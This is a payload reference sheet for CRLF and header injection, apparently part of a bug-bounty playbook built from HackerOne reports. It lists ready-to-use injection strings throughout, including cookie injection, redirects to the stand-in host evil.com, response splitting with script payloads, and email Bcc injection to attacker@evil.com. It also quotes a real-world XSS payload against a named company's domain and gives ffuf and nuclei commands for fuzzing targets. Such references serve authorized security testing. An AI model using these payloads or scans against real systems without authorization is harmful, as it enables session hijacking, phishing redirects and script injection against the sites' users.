# CRLF / Header Injection — HackerOne field guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `%0d%0aSet-Cookie:%20x=1` `%0aLocation:%20//evil.com`

- `%E5%98%8A%E5%98%8D` unicode CRLF

- `\r\n` in filenames and log lines



## Payload bank



**20 curated payloads** in 2 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Header injection



```text

%0d%0aSet-Cookie:%20x=1

%0aSet-Cookie:%20x=1

%0d%0aLocation:%20//evil.com

%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK

%0d%0aX-XSS-Protection:%200

%0d%0a%0d%0a<script>alert(1)</script>

%E5%98%8A%E5%98%8DSet-Cookie:%20x=1

%E5%98%8A%E5%98%8DLocation:%20//evil.com

\r\nSet-Cookie: x=1

\nSet-Cookie: x=1

%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None

%0d%0aRefresh:%200%3burl=//evil.com

```



### Email / log / filename contexts



```text

%0d%0aBcc: attacker@evil.com

%0d%0aCc: attacker@evil.com

%0d%0aSubject:%20injected

a%0d%0aBcc:attacker@evil.com

file%0d%0aSet-Cookie:%20x=1.txt

line1%0d%0aline2

%0d%0a%09injected

%0d%0a%20injected

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_crlf-injection.txt` (20)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 14× | `\r\n` |

| 5× | `rtsp_do()` |

| 5× | `data->set.crlf` |

| 5× | `conn_config->CRLfile` |

| 5× | `Curl_setstropt()` |

| 4× | `Curl_creader_total_length()` |

| 3× | `Mail_mimePart::encodeHeader()` |

| 3× | `cr_init_backend()` |

| 3× | `auth_digest_string_quoted()` |

| 2× | `r\n` |

| 2× | `%0d` |

| 2× | `curl_easy_setopt()` |

| 2× | `stripcslashes()` |

| 2× | `preg_match('#([^\s\x21-\x7E]){1}#')` |

| 2× | `Net_SMTP::quotedata()` |

| 2× | `http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0` |

| 2× | `rtsp_setup_request()` |

| 2× | `rtsp_header_alloc()` |

| 2× | `legit@example.com` |

| 2× | `invalid ${key} header` |



## Parameters observed



`mode` · `newsletter_placement` · `_task` · `_action` · `client_id` · `redirect_uri` · `response_type` · `next_view` · `source` · `reported_user_id` · `reporter_user_id` · `is_media` · `is_promoted` · `reported_tweet_id` · `apikeyrefresh` · `act` · `redirecturl` · `ref` · `cards_platform` · `include_cards`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_crlf-injection.txt` | 94 |

| `~/.local/share/hackerone-reports/wordlists/params_crlf-injection.txt` | 51 |

| `~/.local/share/hackerone-reports/wordlists/payloads_crlf-injection.txt` | 20 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_crlf-injection.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_crlf-injection.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_crlf-injection.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Test params reflected in headers, redirects, filenames, and emails.



```sh

nuclei -u https://target -tags crlf \

       -severity low,medium,high,critical -rl 40 -o nuclei_crlf-injection.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/crlf -dast \

       -rl 40 -o nuclei_crlf-injection_crlf.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_crlf-injection_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
